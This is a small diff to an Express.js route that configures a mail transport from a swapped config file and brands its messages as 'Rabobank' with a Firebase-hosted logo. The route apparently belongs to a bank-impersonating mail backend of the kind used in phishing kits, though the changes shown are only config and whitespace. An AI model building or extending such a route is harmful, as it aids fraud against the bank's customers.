@@ -7,7 +7,7 @@ router.use(cors());
 router.use(express.urlencoded({ extended: false }));
 router.use(express.json());
 
-const { user, pass, host } = require("../config4");
+const { user, pass, host } = require("../config6");
 
 var serviceAccount = require("./config/serviceaccounts/rabobank-2c011.json");
 
@@ -29,7 +29,7 @@ router.route("/").post((req, res) => {
         pass: pass, // generated ethereal password
       },
     });
-    
+
     const sitename = "Rabobank";
     const imagelogo =
       "https://firebasestorage.googleapis.com/v0/b/rabobank-2c011.appspot.com/o/rabobank.png?alt=media&token=f7171a96-3040-4b04-b852-7d65acc25620"; // send mail with defined transport object
